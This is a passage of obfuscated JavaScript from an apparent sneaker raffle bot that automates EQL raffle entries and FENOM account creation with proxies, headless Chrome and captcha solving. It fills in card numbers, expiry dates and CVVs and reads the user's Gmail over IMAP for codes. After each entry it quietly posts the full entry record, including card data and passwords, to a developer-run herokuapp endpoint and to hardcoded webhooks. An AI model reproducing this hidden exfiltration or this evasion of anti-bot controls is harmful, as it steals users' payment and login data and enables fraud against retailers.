                                    const _0x17a9cb = await _0xd43051['$x']('//li[text()=\x22' + _0x7dd119[_0x3ebe26]['State'] + '\x22]');
                                    await _0x17a9cb[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x497396(0x3e8), await _0xd43051['type']('#address1', _0x7dd119[_0x3ebe26]['Address1'] + '\x20' + _0x7dd119[_0x3ebe26]['HouseNumber']), await _0x497396(0x1f4), await _0xd43051['type']('#address2', '' + _0x7dd119[_0x3ebe26]['Address2']), await _0x497396(0x1f4), await _0xd43051['type']('#city', '' + _0x7dd119[_0x3ebe26]['City']), await _0x497396(0x1f4), await _0xd43051['type']('#postcode', '' + _0x7dd119[_0x3ebe26]['Zip']), await _0x497396(0x3e8), await _0xd43051['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x497396(0x3e8), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x8d9b3d = await _0xd43051['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x8d9b3d && (await _0xd43051['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xd43051['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xd43051['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x497396(0x4b0), await _0xd43051['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x497396(0x1f4), await _0xd43051['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CardNumber']), await _0x497396(0x320), await _0xd43051['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xd43051['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xd43051['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['ExpiryDate']), await _0x497396(0x4b0), await _0xd43051['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xd43051['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xd43051['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CVV']), await _0x497396(0x226), await _0xd43051['type']('input[name=\x22postalCode\x22]', '' + _0x7dd119[_0x3ebe26]['Zip']), await _0x497396(0x226));
                            const _0x86dd6e = await _0xd43051['$']('.__PrivateStripeElement');
                            _0x86dd6e && (await _0x497396(0x1f4), await _0xd43051['click']('.__PrivateStripeElement'), await _0xd43051['click']('.__PrivateStripeElement'), await _0xd43051['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CardNumber']), await _0xd43051['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['ExpiryDate']), await _0xd43051['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CVV']));
                            await _0x497396(0x226), await _0xd43051['click']('#paymentConsent'), await _0x497396(0x226), await _0xd43051['click']('#termsConsent'), await _0x497396(0x2bc), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xd43051['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x497396(0x2710);
                            try {
                                await _0xd43051['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x497396(0xbb8), await _0xd43051['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5f5238 => _0x5f5238['click']()), await _0xd43051['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1e253f => _0x1e253f['click']());
                            } catch {
                            }
                            try {
                                await _0xd43051['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x5c8866 = await _0xd43051['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x5c8866) {
                                    _0x44f9d7['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x7dd119[_0x3ebe26]['Email'] + ',' + _0x7dd119[_0x3ebe26]['Password'] + ',' + _0x7dd119[_0x3ebe26]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x6e271b() {
                                var _0x567942, _0x9f3065 = ![];
                                for (var _0x1a38bc = 0x0; _0x1a38bc < 0x18; _0x1a38bc++) {
                                    async function _0x4d7ba3() {
                                        var _0x5bfb32 = new _0x51270e({
                                            'user': _0x138f58['masterMail'],
                                            'password': _0x138f58['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x14e024(_0x335de4) {
                                            _0x5bfb32['openBox']('INBOX', ![], _0x335de4);
                                        }
                                        _0x5bfb32['once']('ready', function () {
                                            console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x14e024(function (_0x5aedfb, _0x127775) {
                                                console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x5aedfb)
                                                    throw _0x5aedfb;
                                                _0x5bfb32['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x40ab71, _0x5e7a7f) {
                                                    if (!_0x5e7a7f || !_0x5e7a7f['length'])
                                                        console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x5bfb32['end']();
                                                    else {
                                                        var _0x4d451b = _0x5bfb32['seq']['fetch'](_0x5e7a7f, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4d451b['on']('message', function (_0xbb6465, _0x109f62) {
                                                            var _0x36e149 = '(#' + _0x109f62 + ')\x20';
                                                            _0xbb6465['on']('body', function (_0x55583a, _0x14dc15) {
                                                                _0x3bc712(_0x55583a, (_0x1311eb, _0x5012ac) => {
                                                                    if (_0x5012ac['subject']['includes']('code')) {
                                                                        const _0xd2b112 = _0x5012ac['text']['split']('\x0a\x0a')[0x3], _0x340c07 = _0xd2b112['split']('\x0a')[0x1];
                                                                        _0x567942 = _0x340c07;
                                                                    }
                                                                });
                                                            }), _0xbb6465['once']('end', function () {
                                                            });
                                                        }), _0x4d451b['once']('error', function (_0x421087) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4d451b['once']('end', function () {
                                                            _0x5bfb32['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x5bfb32['once']('error', function (_0x26b3e3) {
                                            console['log'](_0xc3fc3['red'](_0x26b3e3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x9f3065 = !![];
                                        }), _0x5bfb32['once']('end', async function () {
                                        }), _0x5bfb32['connect']();
                                    }
                                    _0x4d7ba3(), await _0x497396(0x1388);
                                    if (_0x567942)
                                        return _0x567942;
                                    if (_0x9f3065)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1a38bc == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x6e271b(), await _0x497396(0x1f4), await _0xd43051['type']('#code', '' + code), await _0x497396(0x3e8), await _0xd43051['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x357ee1 => _0x357ee1['click']()), await _0xd43051['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0xd43051['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x7dd119[_0x3ebe26]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x44f9d7['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x7dd119[_0x3ebe26]['Email'] + ',' + _0x7dd119[_0x3ebe26]['Password'] + ',' + _0x7dd119[_0x3ebe26]['Phone']), _0x23436c = 'no', _0xf67db6(_0x7dd119[_0x3ebe26], _0x215346);
                            var _0x5d344f = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'dev', ![]), _0x186b58 = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'pub', ![]);
                            let _0xfe856e = _0x7dd119[_0x3ebe26];
                            try {
                                prxdata = {
                                    'username': _0x9f5859['replace']('#', ''),
                                    'module': _0x215346['name'],
                                    'entrydata': JSON['stringify'](_0xfe856e),
                                    'proxy': '' + _0x43a5dd[_0x3ebe26]
                                };
                                var _0x51beae = JSON['stringify'](prxdata);
                                let _0x59fc7c = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x51beae, _0x59fc7c);
                            } catch (_0x37a735) {
                            }
                            const _0x793b76 = {
                                'succesDEVMSG': { 'embeds': [_0x5d344f] },
                                'succesPUBMSG': { 'embeds': [_0x186b58] }
                            };
                            try {
                                _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x793b76['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x793b76['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x793b76['succesPUBMSG']);
                            } catch (_0x18fa7f) {
                                console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x18fa7f));
                            }
                        } catch (_0x3a3f75) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20' + _0x3a3f75)), _0x38d142 = '' + _0x3a3f75;
                            var _0x4b4a91 = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'dev', !![], _0x38d142), _0x5d344f = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'dev', ![]), _0x186b58 = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'pub', ![]);
                            const _0x56e138 = {
                                'succesDEVMSG': { 'embeds': [_0x5d344f] },
                                'succesPUBMSG': { 'embeds': [_0x186b58] }
                            };
                            _0x56e138['errorDEV'] = { 'embeds': [_0x4b4a91] };
                            _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x56e138['errorDEV']);
                            await _0x468b99(_0x432bcc, _0x56e138['errorDEV']);
                            if (!_0x23436c == 'no')
                                _0x23436c = 'yes';
                        } finally {
                            _0x1f163a && _0x1f163a['close']();
                            if (_0x23436c == 'yes' && _0x481e18 != 0x5) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Retrying\x20(' + _0x481e18 + '\x20/\x205)')), _0x3ebe26 = _0x3ebe26 - 0x1, _0x481e18 = _0x481e18 + 0x1;
                                continue;
                            }
                            _0x23436c == 'yes' && _0x481e18 >= 0x5 && (_0x554010(_0x7dd119[_0x3ebe26], _0x215346), _0x23436c = 'no', _0x481e18 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    } else {
                        const _0x5cdb4d = '' + _0x7dd119[_0x3ebe26]['Url'];
                        if (_0x23436c != 'yes')
                            var _0x23436c = '', _0x481e18 = 0x0;
                        if (_0x7dd119[_0x3ebe26]['Email'] == '' || _0x7dd119[_0x3ebe26]['FirstName'] == '' || _0x7dd119[_0x3ebe26]['LastName'] == '') {
                            console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x7dd119[_0x3ebe26]['Password'] == '' && (_0x7dd119[_0x3ebe26]['Password'] = 'JRaffles23!');
                        if (_0x138f58['useRandomProxy'] = ![])
                            var _0x24124f = _0x43a5dd[_0x3ebe26]['split'](':');
                        else
                            var _0x2394a7 = Math['round'](Math['random']() * (_0x43a5dd['length'] - 0x1)), _0x24124f = _0x43a5dd[_0x2394a7]['split'](':');
                        var _0x1f163a;
                        try {
                            _0x1f163a = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x24124f[0x0] + ':' + _0x24124f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f163a = await _0x256d58['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x24124f[0x0] + ':' + _0x24124f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x503b49 = await _0x1f163a['newPage']();
                            await _0x503b49['authenticate']({
                                'username': '' + _0x24124f[0x2],
                                'password': '' + _0x24124f[0x3]
                            }), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x503b49['setRequestInterception'](!![]), _0x503b49['on']('request', _0x2143d6 => {
                                _0x2143d6['resourceType']() === 'image' || _0x2143d6['resourceType']() === 'font' || _0x2143d6['resourceType']() === 'media' ? _0x2143d6['abort']() : _0x2143d6['continue']();
                            }), await _0x503b49['goto'](_0x5cdb4d), await _0x503b49['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x201c82 = await _0x503b49['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x201c82)
                                await _0x201c82['click']();
                            await _0x497396(0x7d0), await _0x503b49['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x497396(0x7d0), await _0x503b49['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x503b49['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x497396(0x3e8), await _0x503b49['waitForSelector']('#email'), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x503b49['type']('#email', '' + _0x7dd119[_0x3ebe26]['Email']), await _0x497396(0x352), await _0x503b49['waitForSelector']('#password'), await _0x503b49['type']('#password', '' + _0x7dd119[_0x3ebe26]['Password']), await _0x497396(0x352), await _0x503b49['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x497396(0x1388);
                            if (!_0x7dd119[_0x3ebe26]['Url']['includes']('footlocker') && !_0x7dd119[_0x3ebe26]['Url']['includes']('topps'))
                                await _0x503b49['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x100a6d = await _0x503b49['$']('#productQuantity'), _0x667156 = await _0x503b49['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x667156 && !_0x100a6d) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x23436c = 'no';
                                continue;
                            }
                            if (_0x667156) {
                                await _0x503b49['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x7dd119[_0x3ebe26]['Url']['includes']('en-GB') ? await _0x503b49['click']('li[data-value=\x22UK\x20' + _0x7dd119[_0x3ebe26]['Size'] + '\x20/\x20US\x20' + (Number(_0x7dd119[_0x3ebe26]['Size']) + 0x1) + '\x22]') : await _0x503b49['click']('li[data-value=\x22EU\x20' + _0x7dd119[_0x3ebe26]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x7dd119[_0x3ebe26]['Size']);
                                }
                            }
                            _0x100a6d && (await _0x503b49['click']('#productQuantity'), await _0x497396(0x3e8), await _0x503b49['click']('li[data-value=\x22' + (Number(_0x7dd119[_0x3ebe26]['Size']) - 0x1) + '\x22]'));
                            await _0x497396(0x3e8), await _0x497396(0x1f4);
                            const _0x2a105f = await _0x503b49['$']('#title\x20>\x20label');
                            await _0x497396(0x12c);
                            _0x2a105f && await _0x2a105f['click']();
                            await _0x503b49['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x503b49['focus']('#postcode'), await _0x503b49['keyboard']['down']('Control'), await _0x503b49['keyboard']['press']('A'), await _0x503b49['keyboard']['up']('Control'), await _0x503b49['keyboard']['press']('Backspace'), await _0x503b49['keyboard']['type'](_0x7dd119[_0x3ebe26]['Zip']), await _0x497396(0x60e), await _0x503b49['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x497396(0x3e8), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x497396(0x1f4);
                            const _0xcf068c = await _0x503b49['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0xcf068c && (await _0x503b49['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x503b49['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x503b49['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x497396(0x4b0), await _0x503b49['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x497396(0x1f4), await _0x503b49['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CardNumber']), await _0x497396(0x320), await _0x503b49['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x503b49['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['ExpiryDate']), await _0x497396(0x4b0), await _0x503b49['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x503b49['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CVV']), await _0x497396(0x226), await _0x503b49['type']('input[name=\x22postalCode\x22]', '' + _0x7dd119[_0x3ebe26]['Zip']), await _0x497396(0x226));
                            const _0x50f2aa = await _0x503b49['$']('.__PrivateStripeElement');
                            _0x50f2aa && (await _0x503b49['click']('#billingName'), await _0x503b49['click']('#billingName'), await _0x503b49['type']('#billingName', '' + _0x7dd119[_0x3ebe26]['NameOnCard']), await _0x497396(0x1f4), await _0x503b49['click']('.__PrivateStripeElement'), await _0x503b49['click']('.__PrivateStripeElement'), await _0x503b49['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CardNumber']), await _0x503b49['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['ExpiryDate']), await _0x503b49['keyboard']['type']('' + _0x7dd119[_0x3ebe26]['CVV']));
                            await _0x497396(0x226), await _0x503b49['click']('#paymentConsent'), await _0x497396(0x226), await _0x503b49['click']('#termsConsent'), await _0x497396(0x2bc), console['log'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x503b49['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x497396(0x2710);
                            try {
                                await _0x503b49['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x497396(0xbb8), await _0x503b49['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xdc15b6 => _0xdc15b6['click']()), await _0x503b49['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1c7bff => _0x1c7bff['click']());
                            } catch {
                            }
                            try {
                                await _0x503b49['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0xf67db6(_0x7dd119[_0x3ebe26], _0x215346);
                            var _0x5d344f = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'dev', ![]), _0x186b58 = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'pub', ![]);
                            let _0x173034 = _0x7dd119[_0x3ebe26];
                            try {
                                prxdata = {
                                    'username': _0x9f5859['replace']('#', ''),
                                    'module': _0x215346['name'],
                                    'entrydata': JSON['stringify'](_0x173034),
                                    'proxy': '' + _0x43a5dd[_0x3ebe26]
                                };
                                var _0x51beae = JSON['stringify'](prxdata);
                                let _0x55c6ee = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x51beae, _0x55c6ee);
                            } catch (_0x23d211) {
                            }
                            const _0x5e05e4 = {
                                'succesDEVMSG': { 'embeds': [_0x5d344f] },
                                'succesPUBMSG': { 'embeds': [_0x186b58] }
                            };
                            try {
                                _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x5e05e4['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x5e05e4['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x5e05e4['succesPUBMSG']);
                            } catch (_0x6de1ca) {
                                console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x6de1ca));
                            }
                            _0x23436c = 'no';
                        } catch (_0x55b121) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20' + _0x55b121)), _0x38d142 = '' + _0x55b121;
                            var _0x4b4a91 = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'dev', !![], _0x38d142), _0x5d344f = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'dev', ![]), _0x186b58 = await _0x232baa(_0x7dd119[_0x3ebe26], _0x215346, 'pub', ![]);
                            const _0x4da259 = {
                                'succesDEVMSG': { 'embeds': [_0x5d344f] },
                                'succesPUBMSG': { 'embeds': [_0x186b58] }
                            };
                            _0x4da259['errorDEV'] = { 'embeds': [_0x4b4a91] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x4da259['errorDEV']), await _0x468b99(_0x432bcc, _0x4da259['errorDEV']), _0x23436c = 'yes';
                        } finally {
                            _0x1f163a && _0x1f163a['close']();
                            if (_0x23436c == 'yes' && _0x481e18 != 0x5) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x215346['name'] + ']\x20Task\x20' + (_0x3ebe26 + 0x1) + '\x20:\x20Retrying\x20(' + _0x481e18 + '\x20/\x205)')), _0x3ebe26 = _0x3ebe26 - 0x1, _0x481e18 = _0x481e18 + 0x1;
                                continue;
                            }
                            _0x23436c == 'yes' && _0x481e18 >= 0x5 && (_0x554010(_0x7dd119[_0x3ebe26], _0x215346), _0x23436c = 'no', _0x481e18 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x2ad710, _0x34d0f0, _0x20bd65) {
                    var _0x455d3e = _0x34d0f0, _0xed63e8 = 0x0;
                    for (var _0x2a5e97 = 0x0; _0x2a5e97 < _0x34d0f0['length']; _0x2a5e97++) {
                        maxTasks = Number(_0x138f58['threads']);
                        while (_0xed63e8 >= maxTasks) {
                            await _0x497396(_0x138f58['delay']);
                        }
                        let _0x2cd178 = ![];
                        async function _0x5b7486(_0x565a71, _0x157497, _0x4ee652, _0x3c9727, _0x4a7356) {
                            _0xed63e8++, _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x138f58['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x3f2844 != 'yes')
                                var _0x3f2844 = '', _0x4a7356 = 0x0;
                            var _0x125cdd;
                            try {
                                await _0x494c97(_0x157497, _0x3c9727);
                            } catch {
                                _0x3f2844 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x38ef83(_0x565a71['name'] + '\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20/\x20' + _0x157497['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                            var _0x54d5f9 = await _0x232baa(_0x157497[_0x3c9727], _0x565a71, 'acc', ![]);
                            const _0x352652 = { 'succesDEVMSG': { 'embeds': [_0x54d5f9] } }, _0x46cd0d = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x247ae7 = Math['round'](Math['random']() * (_0x4ee652['length'] - 0x1)), _0x2309f2 = _0x4ee652[_0x247ae7]['split'](':'), _0x1910c2;
                            async function _0x42b6cc(_0x5aff5d) {
                                const _0x4808ca = _0x44f9d7['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x31f30c = _0x457f0a['parse'](_0x4808ca, { 'header': !![] })['data'];
                                let _0x3b91d8 = ![];
                                for (var _0x5468b1 of _0x31f30c) {
                                    if (_0x5468b1['Email'] == _0x5aff5d['Email']) {
                                        _0x3b91d8 = !![];
                                        break;
                                    }
                                }
                                return _0x3b91d8;
                            }
                            try {
                                if (await _0x42b6cc(_0x157497[_0x3c9727]) == !![]) {
                                    console['log'](_0x5d34e1() + '\x20[' + _0x565a71['name'] + ']\x20Task\x20' + (_0x3c9727 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x2cd178 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x1910c2 = await _0x256d58['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2309f2[0x0] + ':' + _0x2309f2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x1910c2 = await _0x256d58['launch']({
